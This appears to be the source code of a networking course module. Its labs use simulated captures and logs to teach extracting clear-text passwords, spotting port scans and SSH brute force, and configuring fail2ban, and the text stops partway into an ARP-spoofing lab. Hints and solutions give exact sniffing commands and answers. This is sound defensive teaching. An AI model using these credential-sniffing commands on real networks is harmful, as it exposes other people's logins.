/* sudo learn — Networking track, Module 3: Attacks & detection (NET-301..308). Passwords in clear text, scans and
   brute force, ARP spoofing and rogue DHCP, DNS cache poisoning, SYN floods, then the defender's tools: Suricata
   rules and Zeek logs, and a capstone intrusion to reconstruct. Every attack happens on Kestrel's own simulated
   network (net-m3.js has the engine). */
(function () {
  "use strict";
  var T = window.NET_TRACK, S = window.ShEngine, M2 = S.M2, M3 = S.M3, N = window.NetCore, NH = window.NetLab.H, SH = window.ShLab.H;
  var MAYA = "Maya Chen · SRE lead", DEV = "Dev Patel · Security";
  var NOW = S.NOW, DAY = S.DAY, HOUR = 3600000, P = N.P, W = N.W, ME = "10.20.0.15", LEG = "10.20.0.40";
  var ex = T.ex, code = T.code, lines = T.lines;
  var ran = NH.ran, outHas = NH.outHas, rootish = NH.rootish, idx = NH.idx;
  var LABS = [];
  function L(t) { return SH.lines(t || ""); }
  function after(r, i, re, fn) { return r.history.some(function (e, k) { return k > i && re.test(e.cmd) && (!fn || fn(e)); }); }
  function fileLines(r, p) { return L(r.read(p) || "").map(function (l) { return l.trim(); }).filter(Boolean); }
  function word(r, p) { return (r.read(p) || "").trim().toLowerCase(); }
  function pcapOf(r, p) { var t = r.read(p); return t === null ? null : N.readPcap(t); }
  function anyOut(r, re) { return r.history.some(function (e) { return e.out.concat(e.err).some(function (l) { return re.test(l); }); }); }
  function readCap(r, name) { return ran(r, new RegExp("\\b(tcpdump|tshark|zeek|suricata)\\b.*" + name.replace(/\./g, "\\.")), function (e) { return !e.err.some(function (l) { return /No such file|doesn't exist|problem with trace/.test(l); }); }); }
  function pre(names) { return function (sys) { names.forEach(function (n) { M3.preinstall(sys, n); }); }; }
  function at(hoursAgo, s) { return Math.floor((NOW - hoursAgo * HOUR) / 1000) + (s || 0); }
  // A TCP conversation: handshake, the messages ({b: true} for the server's), then a clean close (unless open).
  function conv(t, a, b, pa, pb, msgs, o) {
    o = o || {};
    var steps = [{ flags: "S", dt: 0 }, { dir: "<", flags: "S.", dt: 0.0004 }, { flags: ".", dt: 0.0008 }], d = 0.001;
    msgs.forEach(function (m) { d += m.gap != null ? m.gap : 0.01; var s = { flags: "P.", dt: d }; if (m.b) s.dir = "<"; if (m.data != null) s.data = m.data; if (m.enc) s.enc = m.enc; if (m.app) s.appName = m.app; if (m.sni) s.sni = m.sni; steps.push(s); });
    if (!o.open) { d += 0.01; steps.push({ flags: "F.", dt: d }, { dir: "<", flags: "F.", dt: d + 0.0003 }, { flags: ".", dt: d + 0.0005 }); }
    return P.convo(Object.assign({ t: t, a: a, b: b, pa: pa, pb: pb, steps: steps, isnA: 1000000 + (pa * 7919) % 900000, isnB: 2000000 + (pb * 104729) % 900000 }, o.extra || {}));
  }
  function synProbe(t, a, b, pa, pb, open, isn) { return P.convo({ t: t, a: a, b: b, pa: pa, pb: pb, isnA: isn || 5000 + pb, steps: open === null ? [{ flags: "S", dt: 0 }] : open ? [{ flags: "S", dt: 0 }, { dir: "<", flags: "S.", dt: 0.0004 }, { flags: "R", dt: 0.0005 }] : [{ flags: "S", dt: 0 }, { dir: "<", flags: "R.", dt: 0.0004 }] }); }
  function req(method, path, host, ua, extra, body) { return method + " " + path + " HTTP/1.1\r\nHost: " + host + "\r\nUser-Agent: " + ua + "\r\nAccept: */*\r\n" + (extra || "") + (body != null ? "Content-Length: " + body.length + "\r\n\r\n" + body : "\r\n"); }
  function resp(code, msg, server, extra, body) { body = body || ""; return "HTTP/1.1 " + code + " " + msg + "\r\nServer: " + server + "\r\n" + (extra || "") + "Content-Length: " + body.length + "\r\n\r\n" + body; }
  function sortT(L2) { return L2.sort(function (a, b) { return a.t - b.t; }); }
  var FIREFOX = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0";
  var CAPTURE_HELP = "<p>Reminder: to capture <b>while</b> you work, start tcpdump in the background with <code>&amp;</code>, run your commands, then <code>sudo pkill tcpdump</code>.</p>";

  /* ================================================================== NET-301 Clear text on the wire */
  var FORM_PW = "Tulip-4471", JENKINS = "jenkins-admin:Hunter2-Build!", TELNET_PW = "Rout3r-Pa55";
  function clearCapture() {
    var C = "10.20.5.31", t0 = at(5), L2 = [];
    var body = "username=priya.n&password=" + FORM_PW + "&remember=on";
    L2 = L2.concat(conv(t0, C, LEG, 51544, 80, [{ data: req("POST", "/login", "intranet.kestrel.internal", FIREFOX, "Content-Type: application/x-www-form-urlencoded\r\n", body) }, { b: true, data: resp(302, "Found", "Apache/2.4.29 (Ubuntu)", "Set-Cookie: PHPSESSID=8f1c2e9a7b3d4c5e6f708192a3b4c5d6; path=/\r\nLocation: /dashboard\r\n"), gap: 0.02 }]));
    L2 = L2.concat(conv(t0 + 40, C, LEG, 51602, 8081, [{ data: req("POST", "/job/deploy-prod/build", "kc-legacy-01:8081", "curl/8.5.0", "Authorization: Basic " + btoa(JENKINS) + "\r\n") }, { b: true, data: resp(201, "Created", "Jetty(10.0.13)", "X-Jenkins: 2.387.3\r\nLocation: http://kc-legacy-01:8081/queue/item/5512/\r\n"), gap: 0.05 }]));
    L2 = L2.concat(conv(t0 + 95, C, LEG, 51650, 23, [{ b: true, data: "Ubuntu 18.04.6 LTS\r\nkc-legacy-01 login: ", gap: 0.02 }, { data: "netops\r\n", gap: 2.1 }, { b: true, data: "Password: ", gap: 0.003 }, { data: TELNET_PW + "\r\n", gap: 3.4 }, { b: true, data: "Last login: Mon Nov  9 16:02:11 2026 from 10.20.5.31\r\nnetops@kc-legacy-01:~$ ", gap: 0.4 }, { data: "sudo cat /etc/backup.conf\r\n", gap: 5.2 }, { b: true, data: "BACKUP_HOST=kc-backup-01\r\nBACKUP_USER=svc-backup\r\nnetops@kc-legacy-01:~$ ", gap: 0.3 }, { data: "exit\r\n", gap: 2 }]));
    L2 = L2.concat(conv(t0 + 130, C, "10.20.0.10", 51702, 443, [{ enc: { tls: 22, len: 517, seed: 21 }, app: "TLS ClientHello", sni: "payroll.kestrel.internal" }, { b: true, enc: { tls: 22, len: 1448, seed: 22 }, app: "TLS ServerHello, Certificate", gap: 0.006 }, { enc: { tls: 23, len: 80, seed: 23 }, app: "TLS Finished", gap: 0.007 }, { enc: { tls: 23, len: 690, seed: 24 }, app: "TLS application data", gap: 0.01 }, { b: true, enc: { tls: 23, len: 1398, seed: 25 }, app: "TLS application data", gap: 0.03 }]));
    L2 = L2.concat(conv(t0 + 160, C, ME, 51740, 22, [{ data: "SSH-2.0-PuTTY_Release_0.81\r\n" }, { b: true, data: "SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\r\n", gap: 0.004 }, { enc: { len: 1080, seed: 31 }, app: "SSH key exchange init", gap: 0.01 }, { b: true, enc: { len: 1080, seed: 32 }, app: "SSH key exchange init", gap: 0.01 }, { enc: { len: 52, seed: 33 }, app: "SSH (encrypted)", gap: 0.02 }, { b: true, enc: { len: 52, seed: 34 }, app: "SSH (encrypted)", gap: 0.01 }]));
    return sortT(L2);
  }
  LABS.push({
    id: "net-301", n: 22, module: 3, ticket: "NET-301", xp: 150, layer: "L7",
    title: "Passwords on the wire",
    topic: "clear-text HTTP, Basic auth and Telnet vs HTTPS and SSH",
    from: DEV,
    story: "<p>The auditors put a network tap on the office uplink for ten minutes and handed us <code>~/captures/office.pcap</code>, with one line: <i>\"we could read your passwords\"</i>. I want to know <b>which</b> passwords, so we can rotate them and kill the protocols that leak them.</p><p>Go through the capture and pull out everything a person with a laptop on that network could have read. Then prove it to yourself with your own traffic.</p>",
    learn:
      "<h3>Clear text means anyone on the path can read it</h3><p>Old protocols send everything, passwords included, as plain bytes. Anyone who can see the packets (on the same Wi-Fi, a switch port mirror, a compromised router) reads them like a text file.</p>" +
      '<table class="t"><tr><th>Clear text</th><th>Encrypted version</th><th>What leaks</th></tr><tr><td>HTTP (80)</td><td>HTTPS (443)</td><td>form fields, cookies, Basic auth</td></tr><tr><td>Telnet (23)</td><td>SSH (22)</td><td>everything you type</td></tr><tr><td>FTP (21)</td><td>SFTP (22) / FTPS</td><td>USER and PASS</td></tr><tr><td>SMTP/POP3/IMAP</td><td>STARTTLS, 465/995/993</td><td>mail logins and content</td></tr></table>' +
      "<h3>Reading payloads</h3>" + ex("tcpdump -r FILE -n -A port 80") + "<p><code>-A</code> prints each packet's payload as text. tshark can pull out exactly the field you want:</p>" + ex("tshark -r FILE -Y 'http.request.method == \"POST\"' -T fields -e http.host -e http.file_data") +
      "<p><code>http.file_data</code> is the request body (what a form sends). <code>http.authorization</code> is the Authorization header.</p>" +
      "<h3>Basic auth is not encryption</h3><p><code>Authorization: Basic amVu...</code> is just <b>base64</b> of <code>user:password</code>: an encoding anyone can reverse.</p>" + ex("echo 'ZGV2OnNlY3JldA==' | base64 -d") +
      "<h3>Following a conversation</h3><p>Telnet sends what you type a line (or a key) at a time, spread over many packets. tshark can stitch one TCP conversation back together. List the conversations to find the stream number (streams count from 0 in the order they start), then follow it:</p>" + ex("tshark -r FILE -q -z conv,tcp") + ex("tshark -r FILE -q -z follow,tcp,ascii,2") +
      "<h3>What encryption still shows</h3><p>HTTPS and SSH hide the content, not the fact that you talked: addresses, ports, sizes and timing are visible. HTTPS also shows the <b>server name</b> in the ClientHello (SNI), so an observer learns which site you visited:</p>" + ex("tshark -r FILE -Y tls.handshake.extensions_server_name -T fields -e ip.dst -e tls.handshake.extensions_server_name") +
      "<p>SSH starts with two readable version banners, then nothing readable at all.</p>" + CAPTURE_HELP,
    files: { "captures/office.pcap": N.pcapFile(clearCapture()) },
    system: pre(["tshark"]),
    diagram: ["legacy", "lb"],
    starter: "",
    objectives: [
      {
        id: "form", text: "Someone logged in to the intranet with a web form over HTTP. Find the <b>password</b> they typed and write it to <code>~/form-password.txt</code>.",
        hints: ["Look at the POST request's body: tcpdump -A on port 80, or tshark's http.file_data field.", "tshark -r ~/captures/office.pcap -Y 'http.request.method == \"POST\"' -T fields -e http.file_data\necho '" + FORM_PW + "' > ~/form-password.txt"],
        check: function (r) { if (!readCap(r, "office.pcap")) return "Read ~/captures/office.pcap with tcpdump or tshark."; return (r.read("form-password.txt") || "").trim() === FORM_PW ? true : "The password field in the POST /login body (after password=, up to the &)."; }
      },
      {
        id: "basic", text: "A script triggered a Jenkins build with <b>Basic auth</b>. Decode its header and write the <code>user:password</code> it carried to <code>~/jenkins-cred.txt</code>.",
        hints: ["Extract http.authorization with tshark, then base64 -d the part after \"Basic \".", "tshark -r ~/captures/office.pcap -T fields -e http.authorization -Y http.authorization\necho '" + btoa(JENKINS) + "' | base64 -d > ~/jenkins-cred.txt"],
        check: function (r) {
          if (!ran(r, /\bbase64\b.*(-d|--decode)/)) return "Decode the header's value with base64 -d.";
          return (r.read("jenkins-cred.txt") || "").trim() === JENKINS ? true : "~/jenkins-cred.txt should hold exactly user:password from the decoded header.";
        }
      },
      {
        id: "telnet", text: "Follow the <b>Telnet</b> session and find the password <code>netops</code> logged in with. Write it to <code>~/telnet-password.txt</code>.",
        hints: ["List the TCP conversations, find the one on port 23, and follow that stream (streams are numbered from 0).", "tshark -r ~/captures/office.pcap -q -z conv,tcp\ntshark -r ~/captures/office.pcap -q -z follow,tcp,ascii,2\necho '" + TELNET_PW + "' > ~/telnet-password.txt"],
        check: function (r) {
          if (!ran(r, /\btshark\b.*follow,tcp,ascii|\btcpdump\b.*-\w*A.*\b(port\s+)?23\b|\btcpdump\b.*\b23\b.*-\w*A/, function (e) { return outHas(e, new RegExp(TELNET_PW.replace(/\./g, "\\."))); })) return "Follow the Telnet stream (tshark -z follow,tcp,ascii,N) or print port 23's payloads with tcpdump -A.";
          return (r.read("telnet-password.txt") || "").trim() === TELNET_PW ? true : "The line typed right after the Password: prompt.";
        }
      },
      {
        id: "tls", text: "The HTTPS session's content is encrypted, but its <b>destination name</b> isn't. Which site did that user visit? Write the name to <code>~/https-site.txt</code>.",
        hints: ["The ClientHello's SNI: the tshark field tls.handshake.extensions_server_name.", "tshark -r ~/captures/office.pcap -Y tls.handshake.extensions_server_name -T fields -e tls.handshake.extensions_server_name\necho payroll.kestrel.internal > ~/https-site.txt"],
        check: function (r) { return word(r, "https-site.txt") === "payroll.kestrel.internal" ? true : "Find the server name (SNI) in the TLS ClientHello."; }
      },
      {
        id: "ssh", text: "The SSH session: only its version banners are readable. Which <b>client program</b> did the user connect with? Write its name to <code>~/ssh-client.txt</code>.",
        hints: ["The first payload on port 22 is the client's banner: SSH-2.0-SOFTWARE.", "tcpdump -r ~/captures/office.pcap -n -A port 22 | grep SSH-2.0\necho PuTTY > ~/ssh-client.txt"],
        check: function (r) { return /putty/.test(word(r, "ssh-client.txt")) ? true : "The client's banner is the first SSH-2.0- line, sent by 10.20.5.31."; }
      },
      {
        id: "live", text: "Prove it with your own traffic: capture port 8081 to <code>~/me.pcap</code> in the background while you <code>curl -u test:hunter2</code> kc-legacy-01's Jenkins over HTTP, then read <b>your</b> Authorization header out of the capture.",
        hints: ["sudo tcpdump -i eth0 -w ~/me.pcap port 8081 &, then curl -u test:hunter2 http://kc-legacy-01:8081/, then sudo pkill tcpdump. Read me.pcap with tshark -e http.authorization.", "sudo tcpdump -i eth0 -n -w ~/me.pcap port 8081 &\ncurl -s -o /dev/null -u test:hunter2 http://kc-legacy-01:8081/\nsudo pkill tcpdump\ntshark -r ~/me.pcap -T fields -e http.authorization -Y http.authorization"],
        check: function (r) {
          var pk = pcapOf(r, "me.pcap");
          if (!pk) return "Capture to ~/me.pcap (tcpdump -w) in the background while you run curl.";
          var hit = pk.some(function (p) { return p.data != null && /Authorization: Basic dGVzdDpodW50ZXIy/.test(p.data); });
          if (!hit) return "~/me.pcap doesn't contain your request with -u test:hunter2: start the capture first, then curl, then stop it.";
          return ran(r, /\b(tshark|tcpdump)\b.*me\.pcap/, function (e) { return outHas(e, /Basic dGVzdDpodW50ZXIy/); }) ? true : "Now read the header out of ~/me.pcap (tshark -e http.authorization, or tcpdump -A).";
        }
      }
    ],
    solution: lines("tshark -r ~/captures/office.pcap -Y 'http.request.method == \"POST\"' -T fields -e http.host -e http.file_data", "echo '" + FORM_PW + "' > ~/form-password.txt",
      "tshark -r ~/captures/office.pcap -Y http.authorization -T fields -e http.authorization", "echo '" + btoa(JENKINS) + "' | base64 -d > ~/jenkins-cred.txt",
      "tshark -r ~/captures/office.pcap -q -z conv,tcp", "tshark -r ~/captures/office.pcap -q -z follow,tcp,ascii,2", "echo '" + TELNET_PW + "' > ~/telnet-password.txt",
      "tshark -r ~/captures/office.pcap -Y tls.handshake.extensions_server_name -T fields -e tls.handshake.extensions_server_name", "echo payroll.kestrel.internal > ~/https-site.txt",
      "tcpdump -r ~/captures/office.pcap -n -A port 22 | grep SSH-2.0", "echo PuTTY > ~/ssh-client.txt",
      "sudo tcpdump -i eth0 -n -w ~/me.pcap port 8081 &", "curl -s -o /dev/null -u test:hunter2 http://kc-legacy-01:8081/", "sudo pkill tcpdump", "tshark -r ~/me.pcap -Y http.authorization -T fields -e http.authorization"),
    debrief: "<p>Ticket closed, three passwords to rotate: priya.n's intranet password (an HTML form over HTTP), the Jenkins admin token (Basic auth is base64, not encryption) and netops' Telnet login, plus the backup user name it printed. The HTTPS and SSH sessions gave away only <b>who talked to whom</b>: the payroll site's name in the SNI and PuTTY's version banner.</p><p>The fix isn't \"be careful\": it's never offering the clear-text versions. Redirect HTTP to HTTPS, put Jenkins behind TLS, and turn Telnet off for good (Module 4).</p>",
    realworld: "Run Wireshark on your own machine and visit an http:// site (there are test sites like http://neverssl.com): you'll see your own requests in full. Never capture other people's traffic without permission.",
    quiz: [
      { q: "What is \"Authorization: Basic ZGV2OnNlY3JldA==\"?", options: ["An encrypted password", "base64 of user:password, readable by anyone", "A hash", "A session token"], answer: 1, why: "base64 is an encoding, not encryption: base64 -d reverses it." },
      { q: "What can an observer still see about your HTTPS session?", options: ["Nothing", "The page content", "Addresses, ports, sizes, timing and the server name (SNI)", "Your password"], answer: 2, why: "TLS hides content, not metadata. Encrypted Client Hello (ECH) is starting to hide the SNI too." },
      { q: "Which replaces Telnet?", options: ["FTP", "SSH", "HTTP", "SNMP"], answer: 1, why: "SSH encrypts the whole session, including the login." }
    ]
  });

  /* ================================================================== NET-302 Scans & brute force */
  var SCANNER = "45.155.205.233", BRUTE = "203.0.113.50", BREACH = "198.51.100.23";
  var SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200];
  function scanCapture() {
    var t0 = at(9), L2 = [];
    SCAN_PORTS.forEach(function (p, i) { L2 = L2.concat(synProbe(t0 + i * 0.003, SCANNER, ME, 61123, p, p === 22 || p === 80 || p === 443 ? true : p === 3306 || p === 6379 ? null : false, 77000)); });
    L2 = L2.concat(conv(t0 + 30, "10.20.5.22", ME, 50122, 22, [{ enc: { len: 36, seed: 9 }, app: "SSH (encrypted)" }, { b: true, enc: { len: 52, seed: 11 }, app: "SSH (encrypted)" }], { open: true }));
    L2 = L2.concat(P.dns(t0 + 31, ME, "10.20.0.2", 41022, 3311, "kc-db-01.kestrel.internal", "A", [{ type: "A", data: "10.20.0.21", ttl: 3600 }]));
    return sortT(L2);
  }
  function authLog() {
    var L2 = [], pid = 40100, t = NOW - 7 * HOUR, users = ["root", "admin", "ubuntu", "test", "oracle", "postgres", "git", "user", "pi", "ftp"];
    function line(ms, msg) { return new Date(ms).toISOString().replace("Z", "") + "000+00:00 kc-web-01 " + msg; }
    L2.push(line(t - 3600000, "sshd[2188]: Accepted publickey for dev from 10.20.5.22 port 50122 ssh2: ED25519 SHA256:3kQf1zX0d2Vw9Yh5cJmLr8tPq4nA7bE6uIoGs1HkT2c"));
    for (var i = 0; i < 38; i++) { var u = users[i % users.length], inv = u !== "root"; L2.push(line(t + i * 2100, "sshd[" + (pid + i) + "]: Failed password for " + (inv ? "invalid user " : "") + u + " from " + BRUTE + " port " + (40000 + i * 17) + " ssh2")); }
    for (var j = 0; j < 11; j++) L2.push(line(t + 1800000 + j * 4000, "sshd[" + (pid + 100 + j) + "]: Failed password for deploy from " + BREACH + " port " + (52000 + j * 3) + " ssh2"));
    L2.push(line(t + 1800000 + 11 * 4000, "sshd[" + (pid + 111) + "]: Accepted password for deploy from " + BREACH + " port 52040 ssh2"));
    L2.push(line(t + 1800000 + 11 * 4000 + 50, "sshd[" + (pid + 111) + "]: pam_unix(sshd:session): session opened for user deploy(uid=1003) by deploy(uid=0)"));
    for (var k = 0; k < 3; k++) L2.push(line(t + 2400000 + k * 9000, "sshd[" + (pid + 200 + k) + "]: Failed password for dev from 10.20.5.22 port " + (50200 + k) + " ssh2"));
    L2.push(line(t + 2400000 + 3 * 9000, "sshd[" + (pid + 203) + "]: Accepted publickey for dev from 10.20.5.22 port 50210 ssh2: ED25519 SHA256:3kQf1zX0d2Vw9Yh5cJmLr8tPq4nA7bE6uIoGs1HkT2c"));
    return L2.sort().join("\n") + "\n";
  }
  function bruteSys(sys) { M3.preinstall(sys, "tshark"); M2.putRoot(sys, "/var/log/auth.log", authLog(), 416, 104, 4, NOW - 60000); }
  LABS.push({
    id: "net-302", n: 23, module: 3, ticket: "NET-302", xp: 160, layer: "L4–7",
    title: "Knocking on every door",
    topic: "port scans in a capture, SSH brute force in auth.log, fail2ban",
    from: MAYA,
    story: "<p>The firewall team says kc-web-01 was <b>port-scanned</b> overnight and the SSH log is full of failed logins. Normally that's background noise on the internet. But I want to be sure none of it <b>worked</b>.</p><p>The scan is in <code>~/captures/scan.pcap</code>; the logins are in <code>/var/log/auth.log</code>. Find out who did what, whether anyone got in, and get the guessers banned.</p>",
    learn:
      "<h3>What a port scan looks like</h3><p>A scanner sends a SYN to port after port, very fast, from one source. The answers tell it what's there:</p>" +
      '<table class="t"><tr><th>Reply to the SYN</th><th>Means</th></tr><tr><td>SYN-ACK</td><td><b>open</b> (a SYN scan then sends RST instead of finishing the handshake)</td></tr><tr><td>RST</td><td><b>closed</b>: the host is there, nothing listens</td></tr><tr><td>nothing</td><td><b>filtered</b>: a firewall dropped it</td></tr></table>' +
      ex("tcpdump -r FILE -n 'tcp[tcpflags] == tcp-syn'") + ex("tshark -r FILE -Y 'tcp.flags.syn == 1 && tcp.flags.ack == 1' -T fields -e ip.src -e tcp.srcport") +
      "<h3>Brute force in the logs</h3><p>Every failed SSH login leaves a line in <code>/var/log/auth.log</code>. Count them per address with a pipeline:</p>" + code("sudo grep 'Failed password' /var/log/auth.log | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -rn") +
      "<p>The line that matters most is an <code>Accepted password</code> from an address that was failing a moment before: a guess that worked.</p>" +
      "<h3>fail2ban</h3><p>fail2ban watches the logs and adds firewall rules that ban addresses with too many failures. Configure jails in <code>/etc/fail2ban/jail.local</code> (never jail.conf, which updates overwrite):</p>" + code("[sshd]\nenabled = true\nmaxretry = 5\nbantime = 1h") + code("sudo systemctl restart fail2ban\nsudo fail2ban-client status sshd\nsudo fail2ban-client set sshd banip ADDRESS     # ban one by hand") +
      '<div class="callout">A scan by itself breaks nothing, and the internet scans everyone all day. What turns noise into an incident is a scan or guess followed by something that <b>succeeds</b>.</div>',
    files: { "captures/scan.pcap": N.pcapFile(scanCapture()) },
    system: bruteSys,
    diagram: [],
    starter: "",
    objectives: [
      {
        id: "scanner", text: "Find the address that port-scanned kc-web-01 in <code>~/captures/scan.pcap</code> and write it to <code>~/scanner.txt</code>.",
        hints: ["SYNs (without ACK) to many ports from one source.", "tcpdump -r ~/captures/scan.pcap -n 'tcp[tcpflags] == tcp-syn'\necho " + SCANNER + " > ~/scanner.txt"],
        check: function (r) { if (!readCap(r, "scan.pcap")) return "Read ~/captures/scan.pcap."; return word(r, "scanner.txt") === SCANNER ? true : "Which source sent SYNs to many different ports?"; }
      },
      {
        id: "open", text: "Which ports did the scan find <b>open</b> (answered with SYN-ACK)? Write them to <code>~/open-ports.txt</code>, one per line.",
        hints: ["Filter for packets with both SYN and ACK set: those are kc-web-01's answers from open ports.", "tshark -r ~/captures/scan.pcap -Y 'tcp.flags.syn == 1 && tcp.flags.ack == 1 && ip.dst == " + SCANNER + "' -T fields -e tcp.srcport > ~/open-ports.txt"],
        check: function (r) { var t = fileLines(r, "open-ports.txt").map(Number).sort(function (a, b) { return a - b; }); return t.join(",") === "22,80,443" ? true : t.length ? "Not quite: only the ports that answered SYN-ACK to the scanner." : "Write the open ports to ~/open-ports.txt."; }
      },
      {
        id: "filtered", text: "Two probed ports got <b>no answer at all</b>: filtered by the firewall. Write them to <code>~/filtered-ports.txt</code>.",
        hints: ["Compare the ports the scanner sent SYNs to with the ports that answered (SYN-ACK or RST). Two have no reply.", "tshark -r ~/captures/scan.pcap -Y 'ip.src == " + SCANNER + " && tcp.flags.syn == 1' -T fields -e tcp.dstport | sort -n > /tmp/probed\ntshark -r ~/captures/scan.pcap -Y 'ip.dst == " + SCANNER + "' -T fields -e tcp.srcport | sort -n > /tmp/answered\ncomm -23 /tmp/probed /tmp/answered > ~/filtered-ports.txt"],
        check: function (r) { var t = fileLines(r, "filtered-ports.txt").map(Number).sort(function (a, b) { return a - b; }); return t.join(",") === "3306,6379" ? true : t.length ? "Not quite: the ports with neither a SYN-ACK nor an RST in reply." : "Write the two ports to ~/filtered-ports.txt."; }
      },
      {
        id: "count", text: "Count the failed SSH passwords in <code>/var/log/auth.log</code> <b>per source address</b>, most first, in one pipeline.",
        hints: ["grep the Failed password lines, extract the from address, then sort | uniq -c | sort -rn.", "sudo grep 'Failed password' /var/log/auth.log | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -rn"],
        check: function (r) {
          return ran(r, /\buniq\s+-c\b/, function (e) { return e.out.length >= 2 && /^\s*38\s+(from\s+)?203\.0\.113\.50\s*$/.test(e.out[0]) && e.out.some(function (l) { return /^\s*11\s+(from\s+)?198\.51\.100\.23\s*$/.test(l); }); }) ? true : "One pipeline whose output starts with the count for the busiest address (sort | uniq -c | sort -rn).";
        }
      },
      {
        id: "breach", text: "One brute force <b>worked</b>. Write the account and the address it came from to <code>~/breach.txt</code> (like <code>user 1.2.3.4</code>).",
        hints: ["Look for Accepted password (not publickey) lines.", "sudo grep 'Accepted password' /var/log/auth.log\necho 'deploy " + BREACH + "' > ~/breach.txt"],
        check: function (r) { var t = word(r, "breach.txt"); return /\bdeploy\b/.test(t) && t.indexOf(BREACH) >= 0 ? true : "Which account accepted a password, and from where?"; }
      },
      {
        id: "ban", text: "Install fail2ban, enable the <code>sshd</code> jail in <code>/etc/fail2ban/jail.local</code> with <code>maxretry = 5</code>, restart it, ban the <b>scanner</b> by hand too, and show the jail: all three attackers banned, the office address (3 typos) not.",
        hints: ["apt install fail2ban, write [sshd] enabled = true, maxretry = 5 to jail.local, restart, then fail2ban-client set sshd banip for the scanner.", "sudo apt install -y fail2ban\nprintf '[sshd]\\nenabled = true\\nmaxretry = 5\\nbantime = 1h\\n' | sudo tee /etc/fail2ban/jail.local\nsudo systemctl restart fail2ban\nsudo fail2ban-client set sshd banip " + SCANNER + "\nsudo fail2ban-client status sshd"],
        check: function (r) {
          if (!r.sys.pkgs.fail2ban || !r.sys.pkgs.fail2ban.installed) return "Install fail2ban.";
          var j = S.M4.jail(r.sys, "sshd");
          if (!j.enabled) return "Enable the sshd jail in /etc/fail2ban/jail.local.";
          if (j.maxretry !== 5) return "Set maxretry = 5 for the sshd jail.";
          var b = S.M4.f2bBanned(r.sys);
          if (b.indexOf(BRUTE) < 0 || b.indexOf(BREACH) < 0) return "fail2ban isn't banning the guessers: is it running with your jail.local? (restart it after writing the file)";
          if (b.indexOf("10.20.5.22") >= 0) return "The office address only mistyped 3 times: it shouldn't be banned.";
          if (b.indexOf(SCANNER) < 0) return "Ban the scanner too: sudo fail2ban-client set sshd banip ADDRESS.";
          return ran(r, /fail2ban-client\s+status\s+sshd/, function (e) { return outHas(e, new RegExp("Banned IP list:.*" + SCANNER.replace(/\./g, "\\."))); }) ? true : "Show the jail: sudo fail2ban-client status sshd.";
        }
      }
    ],
    solution: lines("tcpdump -r ~/captures/scan.pcap -n 'tcp[tcpflags] == tcp-syn'", "echo " + SCANNER + " > ~/scanner.txt",
      "tshark -r ~/captures/scan.pcap -Y 'tcp.flags.syn == 1 && tcp.flags.ack == 1 && ip.dst == " + SCANNER + "' -T fields -e tcp.srcport > ~/open-ports.txt",
      "tshark -r ~/captures/scan.pcap -Y 'ip.src == " + SCANNER + " && tcp.flags.syn == 1' -T fields -e tcp.dstport | sort -n > /tmp/probed", "tshark -r ~/captures/scan.pcap -Y 'ip.dst == " + SCANNER + "' -T fields -e tcp.srcport | sort -n > /tmp/answered", "comm -23 /tmp/probed /tmp/answered > ~/filtered-ports.txt",
      "sudo grep 'Failed password' /var/log/auth.log | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -rn",
      "sudo grep 'Accepted password' /var/log/auth.log", "echo 'deploy " + BREACH + "' > ~/breach.txt",
      "sudo apt install -y fail2ban", "printf '[sshd]\\nenabled = true\\nmaxretry = 5\\nbantime = 1h\\n' | sudo tee /etc/fail2ban/jail.local", "sudo systemctl restart fail2ban", "sudo fail2ban-client set sshd banip " + SCANNER, "sudo fail2ban-client status sshd"),
    debrief: "<p>The scan found what it should (22, 80 and 443 open; MySQL and Redis filtered by the firewall). The 38 guesses from 203.0.113.50 were noise. The 11 from <b>198.51.100.23</b> weren't: the 12th guess logged in as <code>deploy</code>. That's an incident: the account's password gets reset, its sessions are reviewed and, as in the Linux track, password logins get switched off so guessing stops mattering.</p><p>fail2ban now bans the guessers. Next: attacks that don't need a password because the attacker sits <b>between</b> you and the server.</p>",
    realworld: "On any internet-facing server, sudo grep -c 'Failed password' /var/log/auth.log (or journalctl -u ssh) shows how constant the guessing is. Key-only SSH plus fail2ban makes it harmless.",
    quiz: [
      { q: "A SYN gets no reply at all. The port is…", options: ["open", "closed", "filtered", "broken"], answer: 2, why: "Closed ports answer RST; silence means something dropped the packet." },
      { q: "Which auth.log line is the real alarm?", options: ["Failed password for root", "Invalid user admin", "Accepted password after many failures from the same address", "Connection closed"], answer: 2, why: "Failures are noise; a success after them is a break-in." },
      { q: "Where do your fail2ban settings go?", options: ["jail.conf", "jail.local", "sshd_config", "/etc/hosts.deny"], answer: 1, why: "jail.local overrides jail.conf and survives package updates." }
    ]
  });

  /* ================================================================== NET-303 Man in the middle on the LAN */
  var EVIL = "10.20.0.66", EVIL_MAC = "52:54:00:66:0e:66", ROGUE = { seg: "build", ip: "10.20.60.177", router: "10.20.60.66", dns: "10.20.60.66", server: "10.20.60.66", mac: "52:54:00:66:0e:67" };
  var INVENTORY = "hostname,ip,mac,role\nkc-gw-01,10.20.0.1," + W.MAC.gw + ",router\nkc-dns-01,10.20.0.2," + W.MAC.dns + ",dns\nkc-lb-01,10.20.0.10," + W.MAC.lb + ",load balancer\nkc-web-01,10.20.0.15," + W.MY_MAC + ",web\nkc-db-01,10.20.0.21," + W.MAC.db + ",database\nkc-backup-01,10.20.0.31," + W.MAC.backup + ",backup\nkc-legacy-01,10.20.0.40,52:54:00:40:aa:01,legacy\nkc-vpn-01,10.20.0.254," + W.MAC.vpn + ",vpn\nkc-gw-01 (build),10.20.60.1,52:54:00:12:35:60,router (build network)\n";
  function mitmSys(sys) {
    var nw = sys.nw;
    M3.preinstall(sys, "iputils-arping");
    nw.arpSpoof = { ip: "10.20.0.1", mac: EVIL_MAC, attacker: EVIL };
    nw.extraPeers.srv = Object.assign({}, nw.extraPeers.srv, {}); nw.extraPeers.srv[EVIL] = { name: null, node: "evil", mac: EVIL_MAC, rtt: 0.33 };
    nw.ambientExtra = function (s, t) {
      if (!s.nw.arpSpoof) return [];
